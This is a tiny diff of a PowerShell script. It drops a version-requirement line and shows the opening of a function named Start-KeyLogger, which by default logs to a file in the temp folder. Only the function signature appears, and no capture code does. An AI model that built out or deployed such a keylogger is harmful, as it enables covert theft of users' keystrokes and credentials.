@@ -1,4 +1,3 @@
-# requires -Version 2
 function Start-KeyLogger($Path = "$env:temp\keylogger.txt") {
     <#
     .DESCRIPTION
